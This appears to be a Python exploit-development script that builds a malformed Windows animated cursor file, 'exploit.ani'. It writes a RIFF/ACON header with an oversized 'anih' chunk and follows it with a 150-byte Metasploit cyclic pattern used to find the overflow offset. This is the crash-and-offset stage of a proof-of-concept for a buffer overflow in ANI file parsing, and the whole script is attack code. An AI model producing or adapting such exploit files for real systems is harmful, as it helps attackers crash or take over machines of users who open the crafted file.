# msf-pattern_create -l 150


aniheader = "\x52\x49\x46\x46\x00\x00\x00\x00\x41\x43\x4f\x4e\x61\x6e\x69\x68"
aniheader = aniheader + "\x24\x00\x00\x00\x24\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00"
aniheader = aniheader + "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
aniheader = aniheader + "\x04\x00\x00\x00\x01\x00\x00\x00\x61\x6e\x69\x68\x96\x00\x00\x00"
print("[+] Building the ANIHEADER data.\n")

padding = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9"
print("[+] Building the payloads data.\n")

payload = aniheader + padding
hFile = open("exploit.ani", 'w')
hFile.write(payload)
hFile.close()
